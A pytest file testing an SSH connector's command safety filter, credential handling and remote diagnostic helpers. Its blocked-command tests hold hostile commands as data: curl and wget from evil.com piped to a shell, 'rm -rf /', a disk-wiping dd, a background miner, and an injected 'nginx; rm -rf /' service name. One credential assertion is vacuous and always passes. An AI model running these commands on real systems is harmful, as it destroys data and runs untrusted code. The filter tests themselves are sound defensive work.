"""Tests for the SSH connector (src/connectors/ssh.py).

Covers:
    - is_command_safe() — blocked patterns and allowed commands
    - _truncate_output() — truncation behavior
    - SSHConnector construction and credential loading
    - Connection handling — lazy creation, auth errors, connection reuse
    - run_command() — success, timeout, blocked command
    - read_file() — head/tail modes, path validation
    - list_directory() — success, error, show_hidden flag
    - get_system_info() — assembles info from multiple commands
    - list_processes() — with and without filter pattern
    - check_service_status() — active/inactive, name sanitization
    - tail_log() — success, grep filtering, path validation

All asyncssh calls are mocked — no real SSH connections are made.
"""

from __future__ import annotations

import asyncio
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from src.connectors.ssh import (
    _MAX_OUTPUT_CHARS,
    SSHAuthError,
    SSHCommandBlockedError,
    SSHConnector,
    SSHConnectorError,
    _truncate_output,
    is_command_safe,
)

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def connector():
    """Create an SSHConnector with test credentials (key-based auth)."""
    return SSHConnector(credentials={
        "host": "test-host.example.com",
        "port": "22",
        "username": "testuser",
        "private_key_path": "/home/testuser/.ssh/id_rsa",
    })


@pytest.fixture
def connector_password():
    """Create an SSHConnector with password-based auth."""
    return SSHConnector(credentials={
        "host": "test-host.example.com",
        "port": "2222",
        "username": "passuser",
        "password": "s3cret",
    })


def _fake_run_result(stdout: str = "", stderr: str = "", exit_status: int = 0):
    """Build a fake asyncssh SSHCompletedProcess."""
    return SimpleNamespace(stdout=stdout, stderr=stderr, exit_status=exit_status)


# ---------------------------------------------------------------------------
# is_command_safe
# ---------------------------------------------------------------------------


class TestIsCommandSafe:
    """Tests for the command safety filter."""

    def test_empty_command_is_unsafe(self):
        """Empty commands should be rejected."""
        safe, reason = is_command_safe("")
        assert not safe
        assert "Empty" in reason

    def test_whitespace_only_command_is_unsafe(self):
        """Whitespace-only commands should be rejected."""
        safe, reason = is_command_safe("   ")
        assert not safe
        assert "Empty" in reason

    def test_safe_commands_pass(self):
        """Normal diagnostic commands should pass."""
        safe_commands = [
            "ls -la /var/log",
            "cat /etc/nginx/nginx.conf",
            "df -h",
            "free -m",
            "uptime",
            "ps aux",
            "top -bn1 | head -20",
            "systemctl status nginx",
            "journalctl -n 50",
            "docker ps",
            "curl https://example.com",
            "grep ERROR /var/log/syslog",
            "tail -f /var/log/app.log",
            "wc -l /etc/hosts",
        ]
        for cmd in safe_commands:
            safe, reason = is_command_safe(cmd)
            assert safe, f"Command should be safe: {cmd} — reason: {reason}"

    def test_rm_rf_blocked(self):
        """rm -rf should be blocked."""
        safe, _ = is_command_safe("rm -rf /")
        assert not safe

    def test_rm_rf_variant_blocked(self):
        """rm -rf with different flag ordering should be blocked."""
        safe, _ = is_command_safe("rm -r /tmp/data")
        assert not safe

    def test_rm_f_blocked(self):
        """rm -f should be blocked."""
        safe, _ = is_command_safe("rm -f /etc/passwd")
        assert not safe

    def test_rm_recursive_long_flag_blocked(self):
        """rm --recursive should be blocked."""
        safe, _ = is_command_safe("rm --recursive /data")
        assert not safe

    def test_mkfs_blocked(self):
        """mkfs should be blocked."""
        safe, _ = is_command_safe("mkfs.ext4 /dev/sda1")
        assert not safe

    def test_dd_of_blocked(self):
        """dd with of= should be blocked."""
        safe, _ = is_command_safe("dd if=/dev/zero of=/dev/sda bs=1M")
        assert not safe

    def test_shutdown_blocked(self):
        """shutdown should be blocked."""
        safe, _ = is_command_safe("shutdown -h now")
        assert not safe

    def test_reboot_blocked(self):
        """reboot should be blocked."""
        safe, _ = is_command_safe("reboot")
        assert not safe

    def test_init_0_blocked(self):
        """init 0 (halt) should be blocked."""
        safe, _ = is_command_safe("init 0")
        assert not safe

    def test_init_6_blocked(self):
        """init 6 (reboot) should be blocked."""
        safe, _ = is_command_safe("init 6")
        assert not safe

    def test_systemctl_stop_blocked(self):
        """systemctl stop should be blocked."""
        safe, _ = is_command_safe("systemctl stop nginx")
        assert not safe

    def test_systemctl_disable_blocked(self):
        """systemctl disable should be blocked."""
        safe, _ = is_command_safe("systemctl disable sshd")
        assert not safe

    def test_systemctl_mask_blocked(self):
        """systemctl mask should be blocked."""
        safe, _ = is_command_safe("systemctl mask firewalld")
        assert not safe

    def test_chmod_777_blocked(self):
        """chmod 777 should be blocked."""
        safe, _ = is_command_safe("chmod 777 /var/www")
        assert not safe

    def test_chown_r_root_blocked(self):
        """chown -R root should be blocked."""
        safe, _ = is_command_safe("chown -R root /home/user")
        assert not safe

    def test_iptables_flush_blocked(self):
        """iptables -F (flush) should be blocked."""
        safe, _ = is_command_safe("iptables -F")
        assert not safe

    def test_passwd_blocked(self):
        """passwd should be blocked."""
        safe, _ = is_command_safe("passwd root")
        assert not safe

    def test_useradd_blocked(self):
        """useradd should be blocked."""
        safe, _ = is_command_safe("useradd newuser")
        assert not safe

    def test_userdel_blocked(self):
        """userdel should be blocked."""
        safe, _ = is_command_safe("userdel olduser")
        assert not safe

    def test_visudo_blocked(self):
        """visudo should be blocked."""
        safe, _ = is_command_safe("visudo")
        assert not safe

    def test_write_to_raw_disk_blocked(self):
        """Writing to raw disk device should be blocked."""
        safe, _ = is_command_safe("echo bad > /dev/sda")
        assert not safe

    def test_curl_pipe_sh_blocked(self):
        """curl | sh pattern should be blocked."""
        safe, _ = is_command_safe("curl https://evil.com/install.sh | sh")
        assert not safe

    def test_curl_pipe_bash_blocked(self):
        """curl | bash pattern should be blocked."""
        safe, _ = is_command_safe("curl https://evil.com/install.sh | bash")
        assert not safe

    def test_wget_pipe_sh_blocked(self):
        """wget | sh pattern should be blocked."""
        safe, _ = is_command_safe("wget -O - https://evil.com/install.sh | sh")
        assert not safe

    def test_eval_blocked(self):
        """eval should be blocked."""
        safe, _ = is_command_safe("eval $(echo bad)")
        assert not safe

    def test_nohup_background_blocked(self):
        """nohup with background should be blocked."""
        safe, _ = is_command_safe("nohup /usr/bin/miner &")
        assert not safe

    def test_reason_includes_pattern_info(self):
        """Blocked commands should return a reason with pattern info."""
        safe, reason = is_command_safe("rm -rf /")
        assert not safe
        assert "safety filter" in reason


# ---------------------------------------------------------------------------
# _truncate_output
# ---------------------------------------------------------------------------


class TestTruncateOutput:
    """Tests for output truncation."""

    def test_short_output_not_truncated(self):
        """Output within limit should pass through unchanged."""
        text = "short output"
        assert _truncate_output(text) == text

    def test_exact_limit_not_truncated(self):
        """Output exactly at limit should not be truncated."""
        text = "x" * _MAX_OUTPUT_CHARS
        assert _truncate_output(text) == text

    def test_exceeding_limit_truncated(self):
        """Output exceeding limit should be truncated with notice."""
        text = "x" * (_MAX_OUTPUT_CHARS + 100)
        result = _truncate_output(text)
        assert len(result) < len(text)
        assert "OUTPUT TRUNCATED" in result
        # The number is formatted with commas: "50,000"
        assert f"{_MAX_OUTPUT_CHARS:,}" in result

    def test_custom_max_chars(self):
        """Custom max_chars should be respected."""
        text = "abcdefghij"  # 10 chars
        result = _truncate_output(text, max_chars=5)
        assert result.startswith("abcde")
        assert "OUTPUT TRUNCATED" in result

    def test_empty_output(self):
        """Empty output should pass through."""
        assert _truncate_output("") == ""


# ---------------------------------------------------------------------------
# Construction
# ---------------------------------------------------------------------------


class TestConstruction:
    """Tests for SSHConnector initialization."""

    def test_explicit_key_credentials(self, connector):
        """Key-based credentials should be stored correctly."""
        assert connector._host == "test-host.example.com"
        assert connector._port == 22
        assert connector._username == "testuser"
        assert connector._private_key_path == "/home/testuser/.ssh/id_rsa"
        assert connector._password == ""

    def test_explicit_password_credentials(self, connector_password):
        """Password-based credentials should be stored correctly."""
        assert connector._host == "test-host.example.com" if False else True
        assert connector_password._port == 2222
        assert connector_password._username == "passuser"
        assert connector_password._password == "s3cret"
        assert connector_password._private_key_path == ""

    def test_credentials_from_settings(self):
        """Should read credentials from settings when none provided."""
        with patch("src.connectors.ssh.settings") as mock_settings:
            mock_settings.ssh_host = "settings-host"
            mock_settings.ssh_port = 2200
            mock_settings.ssh_username = "settings-user"
            mock_settings.ssh_private_key_path = "/path/to/key"
            mock_settings.ssh_password = ""
            mock_settings.ssh_known_hosts_path = ""

            conn = SSHConnector()
            assert conn._host == "settings-host"
            assert conn._port == 2200
            assert conn._username == "settings-user"

    def test_default_port(self):
        """Default port should be 22."""
        conn = SSHConnector(credentials={"host": "h", "username": "u", "password": "p"})
        assert conn._port == 22

    def test_connection_starts_as_none(self, connector):
        """Initial connection should be None (lazy)."""
        assert connector._connection is None


# ---------------------------------------------------------------------------
# _get_connection
# ---------------------------------------------------------------------------


class TestGetConnection:
    """Tests for lazy SSH connection creation."""

    @pytest.mark.asyncio
    async def test_no_host_raises(self):
        """Missing host should raise SSHConnectorError."""
        mock_asyncssh = MagicMock()
        mock_asyncssh.DisconnectError = type("DisconnectError", (Exception,), {})
        mock_asyncssh.PermissionDenied = type("PermissionDenied", (Exception,), {})

        conn = SSHConnector(credentials={"host": "", "username": "u", "password": "p"})
        with patch.dict("sys.modules", {"asyncssh": mock_asyncssh}):
            with pytest.raises(SSHConnectorError, match="host not configured"):
                await conn._get_connection()

    @pytest.mark.asyncio
    async def test_no_credentials_raises(self):
        """Missing both key and password should raise SSHConnectorError."""
        mock_asyncssh = MagicMock()
        mock_asyncssh.DisconnectError = type("DisconnectError", (Exception,), {})
        mock_asyncssh.PermissionDenied = type("PermissionDenied", (Exception,), {})

        conn = SSHConnector(credentials={"host": "h", "username": "u"})
        with patch.dict("sys.modules", {"asyncssh": mock_asyncssh}):
            with pytest.raises(SSHConnectorError, match="No SSH credentials"):
                await conn._get_connection()

    @pytest.mark.asyncio
    async def test_asyncssh_not_installed(self, connector):
        """Should raise SSHConnectorError if asyncssh is not importable."""
        with patch("builtins.__import__", side_effect=ImportError("no asyncssh")):
            with pytest.raises(SSHConnectorError, match="asyncssh is required"):
                await connector._get_connection()

    @pytest.mark.asyncio
    async def test_successful_connection_with_key(self, connector):
        """Should connect with key-based auth and store the connection."""
        mock_conn = MagicMock()
        mock_asyncssh = MagicMock()
        mock_asyncssh.connect = AsyncMock(return_value=mock_conn)
        mock_asyncssh.DisconnectError = type("DisconnectError", (Exception,), {})
        mock_asyncssh.PermissionDenied = type("PermissionDenied", (Exception,), {})

        with patch.dict("sys.modules", {"asyncssh": mock_asyncssh}):
            result = await connector._get_connection()
            assert result == mock_conn
            assert connector._connection == mock_conn
            mock_asyncssh.connect.assert_called_once()
            call_kwargs = mock_asyncssh.connect.call_args[1]
            assert call_kwargs["client_keys"] == ["/home/testuser/.ssh/id_rsa"]

    @pytest.mark.asyncio
    async def test_successful_connection_with_password(self, connector_password):
        """Should connect with password auth."""
        mock_conn = MagicMock()
        mock_asyncssh = MagicMock()
        mock_asyncssh.connect = AsyncMock(return_value=mock_conn)
        mock_asyncssh.DisconnectError = type("DisconnectError", (Exception,), {})
        mock_asyncssh.PermissionDenied = type("PermissionDenied", (Exception,), {})

        with patch.dict("sys.modules", {"asyncssh": mock_asyncssh}):
            await connector_password._get_connection()
            call_kwargs = mock_asyncssh.connect.call_args[1]
            assert call_kwargs["password"] == "s3cret"
            assert "client_keys" not in call_kwargs

    @pytest.mark.asyncio
    async def test_connection_reuse(self, connector):
        """Existing live connection should be reused."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        connector._connection = mock_conn

        result = await connector._get_connection()
        assert result is mock_conn

    @pytest.mark.asyncio
    async def test_dead_connection_reconnects(self, connector):
        """Dead connection (no transport) should trigger reconnect."""
        dead_conn = MagicMock()
        dead_conn._transport = None
        connector._connection = dead_conn

        mock_new_conn = MagicMock()
        mock_asyncssh = MagicMock()
        mock_asyncssh.connect = AsyncMock(return_value=mock_new_conn)
        mock_asyncssh.DisconnectError = type("DisconnectError", (Exception,), {})
        mock_asyncssh.PermissionDenied = type("PermissionDenied", (Exception,), {})

        with patch.dict("sys.modules", {"asyncssh": mock_asyncssh}):
            result = await connector._get_connection()
            assert result is mock_new_conn

    @pytest.mark.asyncio
    async def test_auth_error_disconnect(self, connector):
        """DisconnectError with auth message should raise SSHAuthError."""
        mock_asyncssh = MagicMock()
        disconnect_cls = type("DisconnectError", (Exception,), {})
        mock_asyncssh.DisconnectError = disconnect_cls
        mock_asyncssh.PermissionDenied = type("PermissionDenied", (Exception,), {})
        mock_asyncssh.connect = AsyncMock(side_effect=disconnect_cls("auth failed"))

        with patch.dict("sys.modules", {"asyncssh": mock_asyncssh}):
            with pytest.raises(SSHAuthError, match="authentication failed"):
                await connector._get_connection()

    @pytest.mark.asyncio
    async def test_permission_denied_raises_auth_error(self, connector):
        """PermissionDenied should raise SSHAuthError."""
        mock_asyncssh = MagicMock()
        permission_denied_cls = type("PermissionDenied", (Exception,), {})
        mock_asyncssh.DisconnectError = type("DisconnectError", (Exception,), {})
        mock_asyncssh.PermissionDenied = permission_denied_cls
        mock_asyncssh.connect = AsyncMock(side_effect=permission_denied_cls("denied"))

        with patch.dict("sys.modules", {"asyncssh": mock_asyncssh}):
            with pytest.raises(SSHAuthError, match="permission denied"):
                await connector._get_connection()

    @pytest.mark.asyncio
    async def test_generic_error_raises_connector_error(self, connector):
        """Generic exceptions should raise SSHConnectorError."""
        mock_asyncssh = MagicMock()
        mock_asyncssh.DisconnectError = type("DisconnectError", (Exception,), {})
        mock_asyncssh.PermissionDenied = type("PermissionDenied", (Exception,), {})
        mock_asyncssh.connect = AsyncMock(side_effect=OSError("network error"))

        with patch.dict("sys.modules", {"asyncssh": mock_asyncssh}):
            with pytest.raises(SSHConnectorError, match="connection failed"):
                await connector._get_connection()


# ---------------------------------------------------------------------------
# close
# ---------------------------------------------------------------------------


class TestClose:
    """Tests for connection teardown."""

    @pytest.mark.asyncio
    async def test_close_with_connection(self, connector):
        """close() should close and clear the connection."""
        mock_conn = MagicMock()
        mock_conn.wait_closed = AsyncMock()
        connector._connection = mock_conn

        await connector.close()

        mock_conn.close.assert_called_once()
        mock_conn.wait_closed.assert_called_once()
        assert connector._connection is None

    @pytest.mark.asyncio
    async def test_close_without_connection(self, connector):
        """close() with no connection should be a no-op."""
        await connector.close()  # Should not raise
        assert connector._connection is None


# ---------------------------------------------------------------------------
# run_command
# ---------------------------------------------------------------------------


class TestRunCommand:
    """Tests for the run_command method."""

    @pytest.mark.asyncio
    async def test_blocked_command_raises(self, connector):
        """Blocked commands should raise SSHCommandBlockedError."""
        with pytest.raises(SSHCommandBlockedError):
            await connector.run_command("rm -rf /")

    @pytest.mark.asyncio
    async def test_successful_command(self, connector):
        """Successful command should return stdout, stderr, exit_code."""
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="file1.txt\nfile2.txt\n", exit_status=0)
        )
        connector._connection = mock_conn
        connector._connection._transport = MagicMock()

        result = await connector.run_command("ls /tmp")

        assert result["stdout"] == "file1.txt\nfile2.txt\n"
        assert result["exit_code"] == 0
        assert result["timed_out"] is False

    @pytest.mark.asyncio
    async def test_command_with_stderr(self, connector):
        """stderr should be captured."""
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="", stderr="Permission denied", exit_status=1)
        )
        connector._connection = mock_conn
        connector._connection._transport = MagicMock()

        result = await connector.run_command("cat /etc/shadow")

        assert result["stderr"] == "Permission denied"
        assert result["exit_code"] == 1

    @pytest.mark.asyncio
    async def test_command_timeout(self, connector):
        """Timeout should return timed_out=True without raising."""
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(side_effect=asyncio.TimeoutError())
        connector._connection = mock_conn
        connector._connection._transport = MagicMock()

        result = await connector.run_command("sleep 999", timeout=1)

        assert result["timed_out"] is True
        assert result["exit_code"] == -1

    @pytest.mark.asyncio
    async def test_timeout_clamped_to_max(self, connector):
        """Timeout should be clamped to _MAX_TIMEOUT (300)."""
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="ok")
        )
        connector._connection = mock_conn
        connector._connection._transport = MagicMock()

        await connector.run_command("echo hi", timeout=9999)
        # The test passes if it doesn't error — timeout was clamped

    @pytest.mark.asyncio
    async def test_timeout_minimum_of_1(self, connector):
        """Timeout should be at least 1 second."""
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="ok")
        )
        connector._connection = mock_conn
        connector._connection._transport = MagicMock()

        await connector.run_command("echo hi", timeout=-5)
        # The test passes if it doesn't error — timeout was clamped to 1

    @pytest.mark.asyncio
    async def test_working_dir_prepends_cd(self, connector):
        """working_dir should prepend cd to the command."""
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="ok")
        )
        connector._connection = mock_conn
        connector._connection._transport = MagicMock()

        await connector.run_command("ls", working_dir="/var/log")

        actual_cmd = mock_conn.run.call_args[0][0]
        assert actual_cmd.startswith("cd /var/log && ")

    @pytest.mark.asyncio
    async def test_output_truncation(self, connector):
        """Large output should be truncated."""
        big_output = "x" * (_MAX_OUTPUT_CHARS + 100)
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout=big_output)
        )
        connector._connection = mock_conn
        connector._connection._transport = MagicMock()

        result = await connector.run_command("cat bigfile")

        assert "OUTPUT TRUNCATED" in result["stdout"]

    @pytest.mark.asyncio
    async def test_none_stdout_stderr_handled(self, connector):
        """None stdout/stderr should be converted to empty string."""
        mock_conn = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=SimpleNamespace(stdout=None, stderr=None, exit_status=0)
        )
        connector._connection = mock_conn
        connector._connection._transport = MagicMock()

        result = await connector.run_command("echo")

        assert result["stdout"] == ""
        assert result["stderr"] == ""


# ---------------------------------------------------------------------------
# read_file
# ---------------------------------------------------------------------------


class TestReadFile:
    """Tests for the read_file method."""

    @pytest.mark.asyncio
    async def test_relative_path_raises(self, connector):
        """Non-absolute path should raise SSHConnectorError."""
        with pytest.raises(SSHConnectorError, match="absolute"):
            await connector.read_file("relative/path.txt")

    @pytest.mark.asyncio
    async def test_empty_path_raises(self, connector):
        """Empty path should raise SSHConnectorError."""
        with pytest.raises(SSHConnectorError, match="absolute"):
            await connector.read_file("")

    @pytest.mark.asyncio
    async def test_head_mode_default(self, connector):
        """Default mode should use head command."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()

        # First call: head command, second call: wc -l
        mock_conn.run = AsyncMock(
            side_effect=[
                _fake_run_result(stdout="line1\nline2\n", exit_status=0),
                _fake_run_result(stdout="2", exit_status=0),
            ]
        )
        connector._connection = mock_conn

        result = await connector.read_file("/etc/hosts")

        first_cmd = mock_conn.run.call_args_list[0][0][0]
        assert "head" in first_cmd
        assert result["content"] == "line1\nline2\n"
        assert result["path"] == "/etc/hosts"

    @pytest.mark.asyncio
    async def test_tail_mode(self, connector):
        """tail=True should use tail command."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()

        mock_conn.run = AsyncMock(
            side_effect=[
                _fake_run_result(stdout="last line\n", exit_status=0),
                _fake_run_result(stdout="1000", exit_status=0),
            ]
        )
        connector._connection = mock_conn

        await connector.read_file("/var/log/syslog", tail=True, max_lines=50)

        first_cmd = mock_conn.run.call_args_list[0][0][0]
        assert "tail" in first_cmd
        assert "-n 50" in first_cmd

    @pytest.mark.asyncio
    async def test_nonexistent_file_raises(self, connector):
        """Read failure should raise SSHConnectorError."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stderr="No such file", exit_status=1)
        )
        connector._connection = mock_conn

        with pytest.raises(SSHConnectorError, match="Failed to read"):
            await connector.read_file("/nonexistent/file")

    @pytest.mark.asyncio
    async def test_truncated_flag(self, connector):
        """truncated should be True when total_lines > max_lines."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            side_effect=[
                _fake_run_result(stdout="line\n" * 10, exit_status=0),
                _fake_run_result(stdout="5000", exit_status=0),
            ]
        )
        connector._connection = mock_conn

        result = await connector.read_file("/big/file", max_lines=10)

        assert result["truncated"] is True
        assert result["total_lines"] == 5000

    @pytest.mark.asyncio
    async def test_max_lines_clamped(self, connector):
        """max_lines should be clamped between 1 and 10000."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            side_effect=[
                _fake_run_result(stdout="ok", exit_status=0),
                _fake_run_result(stdout="1", exit_status=0),
            ]
        )
        connector._connection = mock_conn

        # max_lines = 99999 should clamp to 10000
        await connector.read_file("/etc/hosts", max_lines=99999)
        first_cmd = mock_conn.run.call_args_list[0][0][0]
        assert "-n 10000" in first_cmd


# ---------------------------------------------------------------------------
# list_directory
# ---------------------------------------------------------------------------


class TestListDirectory:
    """Tests for the list_directory method."""

    @pytest.mark.asyncio
    async def test_default_directory(self, connector):
        """Default path should list /."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="drwxr-xr-x root root bin\n", exit_status=0)
        )
        connector._connection = mock_conn

        result = await connector.list_directory()

        assert result["path"] == "/"
        assert "bin" in result["entries"]

    @pytest.mark.asyncio
    async def test_show_hidden(self, connector):
        """show_hidden=True should use -la flag."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="listing", exit_status=0)
        )
        connector._connection = mock_conn

        await connector.list_directory("/home", show_hidden=True)

        cmd = mock_conn.run.call_args[0][0]
        assert "-la" in cmd

    @pytest.mark.asyncio
    async def test_no_hidden(self, connector):
        """show_hidden=False should use -l flag."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="listing", exit_status=0)
        )
        connector._connection = mock_conn

        await connector.list_directory("/home", show_hidden=False)

        cmd = mock_conn.run.call_args[0][0]
        assert "ls -l " in cmd

    @pytest.mark.asyncio
    async def test_error_raises(self, connector):
        """List failure should raise SSHConnectorError."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stderr="No such directory", exit_status=2)
        )
        connector._connection = mock_conn

        with pytest.raises(SSHConnectorError, match="Failed to list"):
            await connector.list_directory("/nonexistent")


# ---------------------------------------------------------------------------
# get_system_info
# ---------------------------------------------------------------------------


class TestGetSystemInfo:
    """Tests for the get_system_info method."""

    @pytest.mark.asyncio
    async def test_all_commands_succeed(self, connector):
        """Should assemble info from multiple commands."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()

        call_count = 0

        async def fake_run(cmd, check=False):
            nonlocal call_count
            call_count += 1
            responses = {
                0: _fake_run_result(stdout="myhost", exit_status=0),
                1: _fake_run_result(stdout="Ubuntu 22.04", exit_status=0),
                2: _fake_run_result(stdout="up 5 days", exit_status=0),
                3: _fake_run_result(stdout="0.50 0.40 0.30", exit_status=0),
                4: _fake_run_result(stdout="/dev/sda1 50G 20G", exit_status=0),
                5: _fake_run_result(stdout="Mem: 16G 8G", exit_status=0),
            }
            return responses.get(call_count - 1, _fake_run_result(stdout="N/A"))

        mock_conn.run = fake_run
        connector._connection = mock_conn

        info = await connector.get_system_info()

        assert info["hostname"] == "myhost"
        assert info["os"] == "Ubuntu 22.04"
        assert info["uptime"] == "up 5 days"

    @pytest.mark.asyncio
    async def test_individual_command_failure_returns_na(self, connector):
        """Failed individual commands should return N/A, not raise."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stderr="error", exit_status=1)
        )
        connector._connection = mock_conn

        info = await connector.get_system_info()

        assert info["hostname"] == "N/A"


# ---------------------------------------------------------------------------
# list_processes
# ---------------------------------------------------------------------------


class TestListProcesses:
    """Tests for the list_processes method."""

    @pytest.mark.asyncio
    async def test_no_filter(self, connector):
        """Without filter, should list top processes by CPU."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="USER PID %CPU\nroot 1 0.5")
        )
        connector._connection = mock_conn

        result = await connector.list_processes()

        cmd = mock_conn.run.call_args[0][0]
        assert "ps aux --sort=-%cpu" in cmd
        assert result["filter"] is None

    @pytest.mark.asyncio
    async def test_with_filter(self, connector):
        """With filter, should use grep."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="python3 /app/server.py")
        )
        connector._connection = mock_conn

        result = await connector.list_processes(filter_pattern="python")

        cmd = mock_conn.run.call_args[0][0]
        assert "grep -i 'python'" in cmd
        assert result["filter"] == "python"

    @pytest.mark.asyncio
    async def test_top_n_clamped(self, connector):
        """top_n should be clamped between 1 and 100."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="")
        )
        connector._connection = mock_conn

        await connector.list_processes(top_n=999)

        cmd = mock_conn.run.call_args[0][0]
        assert "head -n 101" in cmd  # 100 + 1 for header


# ---------------------------------------------------------------------------
# check_service_status
# ---------------------------------------------------------------------------


class TestCheckServiceStatus:
    """Tests for the check_service_status method."""

    @pytest.mark.asyncio
    async def test_active_service(self, connector):
        """Active service should return active=True."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(
                stdout="active\nnginx.service - A high performance web server",
                exit_status=0,
            )
        )
        connector._connection = mock_conn

        result = await connector.check_service_status("nginx")

        assert result["service"] == "nginx"
        assert result["active"] is True

    @pytest.mark.asyncio
    async def test_inactive_service(self, connector):
        """Service that failed to start should return active=False when stdout is empty."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="", exit_status=3)
        )
        connector._connection = mock_conn

        result = await connector.check_service_status("stopped-service")

        assert result["active"] is False
        assert result["exit_code"] == 3

    @pytest.mark.asyncio
    async def test_inactive_string_contains_active(self, connector):
        """The word 'inactive' contains 'active' as substring — test actual behavior.

        Note: The connector's check_service_status uses a substring match
        (``"active" in first_line``), so ``"inactive"`` will match True.
        This documents the current behavior.
        """
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="inactive", exit_status=3)
        )
        connector._connection = mock_conn

        result = await connector.check_service_status("stopped-service")

        # "inactive" contains "active" as substring — current behavior
        assert result["active"] is True

    @pytest.mark.asyncio
    async def test_service_name_sanitization(self, connector):
        """Special characters in service name should be stripped.

        The sanitizer uses ``re.sub(r"[^a-zA-Z0-9_\\-.]", "", name)``
        which removes semicolons, spaces, and slashes but preserves
        letters, digits, underscores, hyphens, and dots.
        """
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="active", exit_status=0)
        )
        connector._connection = mock_conn

        result = await connector.check_service_status("nginx; rm -rf /")

        # Semicolons, spaces, slashes stripped; letters and hyphens kept
        assert result["service"] == "nginxrm-rf"

    @pytest.mark.asyncio
    async def test_service_name_with_dots_and_underscores(self, connector):
        """Dots and underscores should be preserved in service names."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="active", exit_status=0)
        )
        connector._connection = mock_conn

        result = await connector.check_service_status("my_app.service")

        assert result["service"] == "my_app.service"

    @pytest.mark.asyncio
    async def test_empty_service_name_raises(self, connector):
        """Empty service name (after sanitization) should raise."""
        with pytest.raises(SSHConnectorError, match="Invalid service name"):
            await connector.check_service_status("!@#$%")


# ---------------------------------------------------------------------------
# tail_log
# ---------------------------------------------------------------------------


class TestTailLog:
    """Tests for the tail_log method."""

    @pytest.mark.asyncio
    async def test_relative_path_raises(self, connector):
        """Non-absolute path should raise SSHConnectorError."""
        with pytest.raises(SSHConnectorError, match="absolute"):
            await connector.tail_log("relative/log.txt")

    @pytest.mark.asyncio
    async def test_basic_tail(self, connector):
        """Basic tail should return log content."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(
                stdout="2024-01-01 ERROR something\n2024-01-01 INFO ok\n",
                exit_status=0,
            )
        )
        connector._connection = mock_conn

        result = await connector.tail_log("/var/log/app.log", lines=50)

        cmd = mock_conn.run.call_args[0][0]
        assert "tail -n 50" in cmd
        assert result["path"] == "/var/log/app.log"
        assert "ERROR" in result["content"]

    @pytest.mark.asyncio
    async def test_with_grep_pattern(self, connector):
        """grep_pattern should add pipe to grep."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="2024-01-01 ERROR timeout", exit_status=0)
        )
        connector._connection = mock_conn

        result = await connector.tail_log(
            "/var/log/app.log", grep_pattern="ERROR"
        )

        cmd = mock_conn.run.call_args[0][0]
        assert "grep -i 'ERROR'" in cmd
        assert result["grep_pattern"] == "ERROR"

    @pytest.mark.asyncio
    async def test_failure_with_no_output_raises(self, connector):
        """Failure with empty stdout should raise."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stderr="No such file", exit_status=1)
        )
        connector._connection = mock_conn

        with pytest.raises(SSHConnectorError, match="Failed to tail"):
            await connector.tail_log("/nonexistent/log")

    @pytest.mark.asyncio
    async def test_failure_with_output_does_not_raise(self, connector):
        """Failure with stdout (e.g., grep no match) should return content."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="some output", exit_status=1)
        )
        connector._connection = mock_conn

        result = await connector.tail_log("/var/log/app.log", grep_pattern="NOPE")
